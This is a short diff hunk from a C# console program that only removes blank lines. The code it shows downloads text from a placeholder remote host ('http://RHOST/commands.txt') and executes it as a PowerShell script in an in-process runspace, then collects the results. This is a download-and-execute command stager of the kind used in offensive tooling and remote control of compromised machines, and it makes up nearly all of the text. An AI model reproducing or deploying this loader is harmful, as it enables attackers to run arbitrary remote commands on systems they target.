@@ -18,20 +18,13 @@ namespace ConsoleApp3
             WebClient client = new WebClient();
             var myString = client.DownloadString("http://RHOST/commands.txt");
             Console.WriteLine("Command to be executed: " + myString);
-            
-
             Runspace runspace = RunspaceFactory.CreateRunspace();
-
             runspace.Open();
-
             Pipeline pipeline = runspace.CreatePipeline();
             pipeline.Commands.AddScript(myString);
             pipeline.Commands.Add("Out-String");
-
             Collection<PSObject> results = pipeline.Invoke();
-
             runspace.Close();
-
             StringBuilder stringBuilder = new StringBuilder();
             foreach (PSObject obj in results)
             {
